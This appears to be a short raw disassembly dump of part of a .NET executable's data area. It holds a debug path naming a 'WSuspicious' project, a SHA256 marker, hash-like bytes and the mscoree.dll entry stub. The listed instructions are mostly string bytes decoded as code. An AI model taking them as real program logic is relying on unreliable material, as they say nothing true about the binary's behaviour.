  40ce7c:	5c                   	pop    %esp
  40ce7d:	73 68                	jae    0x40cee7
  40ce7f:	61                   	popa
  40ce80:	72 65                	jb     0x40cee7
  40ce82:	64 5f                	fs pop %edi
  40ce84:	66 6f                	outsw  %ds:(%esi),(%dx)
  40ce86:	6c                   	insb   (%dx),%es:(%edi)
  40ce87:	64 65 72 5c          	fs gs jb 0x40cee7
  40ce8b:	65 78 63             	gs js  0x40cef1
  40ce8e:	65 70 74             	gs jo  0x40cf05
  40ce91:	69 6f 6e 5c 57 53 75 	imul   $0x7553575c,0x6e(%edi),%ebp
  40ce98:	73 70                	jae    0x40cf0a
  40ce9a:	69 63 69 6f 75 73 5c 	imul   $0x5c73756f,0x69(%ebx),%esp
  40cea1:	57                   	push   %edi
  40cea2:	53                   	push   %ebx
  40cea3:	75 73                	jne    0x40cf18
  40cea5:	70 69                	jo     0x40cf10
  40cea7:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  40ceaa:	75 73                	jne    0x40cf1f
  40ceac:	5c                   	pop    %esp
  40cead:	6f                   	outsl  %ds:(%esi),(%dx)
  40ceae:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  40ceb1:	44                   	inc    %esp
  40ceb2:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40ceb6:	5c                   	pop    %esp
  40ceb7:	6e                   	outsb  %ds:(%esi),(%dx)
  40ceb8:	65 74 34             	gs je  0x40ceef
  40cebb:	35 5c 57 53 75       	xor    $0x7553575c,%eax
  40cec0:	73 70                	jae    0x40cf32
  40cec2:	69 63 69 6f 75 73 2e 	imul   $0x2e73756f,0x69(%ebx),%esp
  40cec9:	70 64                	jo     0x40cf2f
  40cecb:	62 00                	bound  %eax,(%eax)
  40cecd:	53                   	push   %ebx
  40cece:	48                   	dec    %eax
  40cecf:	41                   	inc    %ecx
  40ced0:	32 35 36 00 4d 2a    	xor    0x2a4d0036,%dh
  40ced6:	76 cd                	jbe    0x40cea5
  40ced8:	89 93 0e 55 a7 ad    	mov    %edx,-0x5258aaf2(%ebx)
  40cede:	d4 b5                	aam    $0xb5
  40cee0:	63 a2 bb ad 3f b8    	arpl   %esp,-0x47c05245(%edx)
  40cee6:	31 ba 23 57 55 d0    	xor    %edi,-0x2faaa8dd(%edx)
  40ceec:	4a                   	dec    %edx
  40ceed:	71 7a                	jno    0x40cf69
  40ceef:	68 36 41 f7 45       	push   $0x45f74136
  40cef4:	1c cf                	sbb    $0xcf,%al
	...
  40cefe:	00 00                	add    %al,(%eax)
  40cf00:	36 cf                	ss iret
  40cf02:	00 00                	add    %al,(%eax)
  40cf04:	00 20                	add    %ah,(%eax)
	...
  40cf1a:	00 00                	add    %al,(%eax)
  40cf1c:	28 cf                	sub    %cl,%bh
	...
  40cf2a:	5f                   	pop    %edi
  40cf2b:	43                   	inc    %ebx
  40cf2c:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf2d:	72 45                	jb     0x40cf74
  40cf2f:	78 65                	js     0x40cf96
  40cf31:	4d                   	dec    %ebp
  40cf32:	61                   	popa
  40cf33:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40cf3a:	72 65                	jb     0x40cfa1
  40cf3c:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40cf40:	6c                   	insb   (%dx),%es:(%edi)
  40cf41:	00 00                	add    %al,(%eax)
  40cf43:	00 00                	add    %al,(%eax)
  40cf45:	00 ff                	add    %bh,%bh
  40cf47:	25 00 20 40 00       	and    $0x402000,%eax
